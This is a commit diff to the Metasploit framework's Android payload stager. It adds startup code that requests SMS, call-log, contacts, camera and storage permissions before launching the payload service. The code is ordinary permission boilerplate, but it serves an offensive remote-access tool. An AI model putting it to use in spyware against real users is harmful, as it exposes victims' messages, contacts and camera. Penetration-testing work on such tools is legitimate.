76c4df93eb4455fb212bc450c48e949d94849a8f
Abdulmanan0315 <mananuol223@gmail.com>
2020-04-30 20:06:57 +0500

    Update MainActivity.java
    Added code to ask for permissions on app startup;
    Related to https://github.com/rapid7/metasploit-framework/issues/13349

--- java/androidpayload/app/src/com/metasploit/stage/MainActivity.java
+++ java/androidpayload/app/src/com/metasploit/stage/MainActivity.java
@@ -8,7 +8,41 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        
+        // Asking for multiple permissions on app startup if android version if >= Marshmallow(6.0)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            int PERMISSION_ALL = 1;
+            String[] PERMISSIONS = {
+                    Manifest.permission.INTERNET,
+                    Manifest.permission.READ_SMS,            
+                    Manifest.permission.SEND_SMS,
+                    Manifest.permission.RECEIVE_SMS,                
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                    Manifest.permission.READ_EXTERNAL_STORAGE,
+                    Manifest.permission.WAKE_LOCK,
+            };
+
+            if (!hasPermissions(this, PERMISSIONS)) {
+                ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
+            }
+        }
+        
         MainService.startService(this);
         finish();
     }
+    
+    // Function to check and request permission
+    public static boolean hasPermissions(Context context, String... permissions) {
+        if (context != null && permissions != null) {
+            for (String permission : permissions) {
+                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
+                    return false;
+                }
+            }
+        }
+        return true;
+    }    
 }
